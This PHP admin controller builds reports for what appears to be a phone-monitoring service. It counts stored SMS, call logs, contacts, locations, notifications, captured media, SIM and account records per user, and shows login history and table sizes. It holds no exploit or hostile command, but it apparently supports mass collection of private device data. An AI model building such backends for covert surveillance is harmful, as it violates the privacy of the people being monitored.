<?php

namespace App\Controllers\admin;

class Reports extends BaseAdminController
{
    public function index()
    {
        $db = $this->getDb();

        $totalUsers = $db->table('users')->where('deleted_at IS NULL')->countAllResults();
        $usersWithData = $db->table('uploaded_files')->select('token_owner_id')->groupBy('token_owner_id')->countAllResults();
        $totalUploads = $db->table('uploaded_files')->countAllResults();
        $totalStorage = $db->table('uploaded_files')->selectSum('file_size_bytes')->get()->getRow()->file_size_bytes ?? 0;

        $dataTypeCounts = [];
        $dataTables = [
            'SMS' => 'tbl_sms', 'Calls' => 'tbl_logs', 'Contacts' => 'tbl_contacts',
            'Apps' => 'tbl_apps', 'Locations' => 'tbl_location', 'Activities' => 'tbl_activity',
            'Files' => 'tbl_device_files', 'Uploads' => 'uploaded_files',
        ];
        foreach ($dataTables as $label => $table) {
            $dataTypeCounts[] = [
                'label' => $label,
                'count' => $db->table($table)->countAllResults(),
            ];
        }

        return $this->renderView('admin/reports/index', [
            'pag' => 'admin-reports',
            'total_users' => $totalUsers,
            'users_with_data' => $usersWithData,
            'total_uploads' => $totalUploads,
            'total_storage' => $totalStorage,
            'data_type_counts' => $dataTypeCounts,
        ]);
    }

    public function user_activity()
    {
        $db = $this->getDb();
        $users = $db->table('users')
            ->select('users.id, users.username, auth_identities.secret as email')
            ->join('auth_identities', "auth_identities.user_id = users.id AND auth_identities.type = 'email_password'", 'left')
            ->where('users.deleted_at IS NULL')
            ->orderBy('users.username', 'ASC')
            ->get()
            ->getResultArray();

        return $this->renderView('admin/reports/user_activity', [
            'pag' => 'admin-reports-user-activity',
            'users' => $users,
        ]);
    }

    public function user_activity_report(string $username)
    {
        $db = $this->getDb();

        $user = $db->table('users')
            ->where('username', $username)
            ->where('deleted_at IS NULL')
            ->get()
            ->getRowArray();

        if (!$user) {
            return redirect()->to('admin/reports/user-activity')->with('error', 'User not found.');
        }

        $userId = $user['id'];

        $dataTables = [
            'SMS' => 'tbl_sms', 'Call Logs' => 'tbl_logs', 'Contacts' => 'tbl_contacts',
            'Apps' => 'tbl_apps', 'Locations' => 'tbl_location', 'Activities' => 'tbl_activity',
            'Files' => 'tbl_device_files', 'Uploads' => 'uploaded_files',
        ];
        $counts = [];
        foreach ($dataTables as $label => $table) {
            $ownerCol = ($table === 'uploaded_files') ? 'token_owner_id' : 'owner_id';
            $counts[] = [
                'label' => $label,
                'count' => $db->table($table)->where($ownerCol, $userId)->countAllResults(),
            ];
        }

        $loginHistory = $db->table('auth_logins')
            ->where('user_id', $userId)
            ->orderBy('date', 'DESC')
            ->limit(20)
            ->get()
            ->getResultArray();

        $actions = $db->table('tbl_user_actions')
            ->where('user_id', $userId)
            ->orderBy('created_at', 'DESC')
            ->limit(20)
            ->get()
            ->getResultArray();

        $uploadsPerDay = $db->table('uploaded_files')
            ->select("DATE(uploaded_at) as date, COUNT(*) as count")
            ->where('token_owner_id', $userId)
            ->where('uploaded_at >= DATE_SUB(NOW(), INTERVAL 30 DAY)')
            ->groupBy('DATE(uploaded_at)')
            ->get()
            ->getResultArray();

        return $this->renderView('admin/reports/user_activity_report', [
            'pag' => 'admin-reports-user-activity',
            'report_user' => $user,
            'data_counts' => $counts,
            'login_history' => $loginHistory,
            'actions' => $actions,
            'uploads_per_day' => $uploadsPerDay,
        ]);
    }

    public function data_usage()
    {
        $db = $this->getDb();

        $dataTables = [
            'SMS' => 'tbl_sms', 'Call Logs' => 'tbl_logs', 'Contacts' => 'tbl_contacts',
            'Apps' => 'tbl_apps', 'Locations' => 'tbl_location', 'Activities' => 'tbl_activity',
            'Files' => 'tbl_device_files', 'Device Context' => 'tbl_device_context',
            'Network' => 'tbl_network_info', 'Accounts' => 'tbl_accounts',
            'Calendar' => 'tbl_calendar_events', 'App Usage' => 'tbl_app_usage',
            'Notifications' => 'tbl_notifications', 'Bluetooth' => 'tbl_bluetooth',
            'Sensors' => 'tbl_sensor_profile', 'Security' => 'tbl_security_audit',
            'Media' => 'tbl_captured_media', 'SIM' => 'tbl_sim_configs',
            'Uploaded Files' => 'uploaded_files',
        ];

        $totals = [];
        $grandTotal = 0;
        foreach ($dataTables as $label => $table) {
            $count = $db->table($table)->countAllResults();
            $totals[] = ['label' => $label, 'count' => $count];
            $grandTotal += $count;
        }

        $users = $db->table('users')
            ->select('users.id, users.username')
            ->where('users.deleted_at IS NULL')
            ->get()
            ->getResultArray();

        $userData = [];
        foreach ($users as $u) {
            $total = 0;
            foreach ($dataTables as $table) {
                $ownerCol = ($table === 'uploaded_files') ? 'token_owner_id' : 'owner_id';
                $total += $db->table($table)->where($ownerCol, $u['id'])->countAllResults();
            }
            if ($total > 0) {
                $userData[] = ['username' => $u['username'], 'total' => $total];
            }
        }
        usort($userData, fn($a, $b) => $b['total'] - $a['total']);

        return $this->renderView('admin/reports/data_usage', [
            'pag' => 'admin-reports-data-usage',
            'totals' => $totals,
            'grand_total' => $grandTotal,
            'user_data' => $userData,
        ]);
    }

    public function performance()
    {
        $db = $this->getDb();

        $totalQueries = 0;
        $queryTime = 0;

        $tableSizes = [];
        foreach ($db->listTables() as $table) {
            $status = $db->query("SHOW TABLE STATUS LIKE '{$table}'")->getRow();
            $size = ($status->Data_length ?? 0) + ($status->Index_length ?? 0);
            if ($size > 0) {
                $tableSizes[] = ['name' => $table, 'size' => $size, 'rows' => $status->Rows ?? 0];
            }
        }
        usort($tableSizes, fn($a, $b) => $b['size'] - $a['size']);

        $errorRate = $db->table('tbl_user_actions')
            ->select("COUNT(*) as total, SUM(CASE WHEN success = 0 THEN 1 ELSE 0 END) as failed")
            ->get()
            ->getRow();

        $uploadsByDay = $db->table('uploaded_files')
            ->select("DATE(uploaded_at) as date, COUNT(*) as count, AVG(file_size_bytes) as avg_size")
            ->where('uploaded_at >= DATE_SUB(NOW(), INTERVAL 7 DAY)')
            ->groupBy('DATE(uploaded_at)')
            ->get()
            ->getResultArray();

        return $this->renderView('admin/reports/performance', [
            'pag' => 'admin-reports-performance',
            'table_sizes' => $tableSizes,
            'total_db_size' => array_sum(array_column($tableSizes, 'size')),
            'total_records' => array_sum(array_column($tableSizes, 'rows')),
            'error_rate' => $errorRate,
            'uploads_by_day' => $uploadsByDay,
            'php_version' => PHP_VERSION,
            'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
            'memory_limit' => ini_get('memory_limit'),
            'max_upload' => ini_get('upload_max_filesize'),
            'max_post' => ini_get('post_max_size'),
            'max_execution' => ini_get('max_execution_time'),
        ]);
    }

    public function generate()
    {
        $db = $this->getDb();

        if ($this->request->getMethod() === 'POST') {
            $dateFrom = $this->request->getPost('date_from');
            $dateTo = $this->request->getPost('date_to');
            $dataTypes = $this->request->getPost('data_types') ?? [];

            $tableMap = [
                'sms' => 'tbl_sms', 'calls' => 'tbl_logs', 'contacts' => 'tbl_contacts',
                'apps' => 'tbl_apps', 'locations' => 'tbl_location', 'activities' => 'tbl_activity',
                'uploads' => 'uploaded_files',
            ];

            $results = [];
            $grandTotal = 0;
            foreach ($dataTypes as $type) {
                if (!isset($tableMap[$type])) continue;
                $table = $tableMap[$type];
                $dateCol = $type === 'uploads' ? 'uploaded_at' : 'created_at';
                $count = $db->table($table)
                    ->where("{$dateCol} >=", $dateFrom ?: '1970-01-01')
                    ->where("{$dateCol} <=", $dateTo ?: date('Y-m-d'))
                    ->countAllResults();
                $results[] = ['type' => $type, 'label' => ucfirst($type), 'count' => $count];
                $grandTotal += $count;
            }

            return $this->renderView('admin/reports/generate', [
                'pag' => 'admin-reports-generate',
                'results' => $results,
                'grand_total' => $grandTotal,
                'date_from' => $dateFrom,
                'date_to' => $dateTo,
                'selected_types' => $dataTypes,
            ]);
        }

        return $this->renderView('admin/reports/generate', [
            'pag' => 'admin-reports-generate',
            'results' => null,
            'grand_total' => 0,
            'date_from' => date('Y-m-d', strtotime('-30 days')),
            'date_to' => date('Y-m-d'),
            'selected_types' => [],
        ]);
    }

    public function export()
    {
        $db = $this->getDb();
        $type = $this->request->getPost('type') ?? 'all';
        $dateFrom = $this->request->getPost('date_from') ?? '1970-01-01';
        $dateTo = $this->request->getPost('date_to') ?? date('Y-m-d');

        $csv = "Type,Table,Count\n";
        $tableMap = [
            'SMS' => 'tbl_sms', 'Call Logs' => 'tbl_logs', 'Contacts' => 'tbl_contacts',
            'Apps' => 'tbl_apps', 'Locations' => 'tbl_location', 'Activities' => 'tbl_activity',
            'Device Files' => 'tbl_device_files', 'Uploaded Files' => 'uploaded_files',
        ];

        foreach ($tableMap as $label => $table) {
            $count = $db->table($table)->countAllResults();
            $csv .= "{$label},{$table},{$count}\n";
        }

        return $this->response
            ->setHeader('Content-Type', 'text/csv')
            ->setHeader('Content-Disposition', 'attachment; filename="report_' . date('Y-m-d') . '.csv"')
            ->setBody($csv);
    }
}
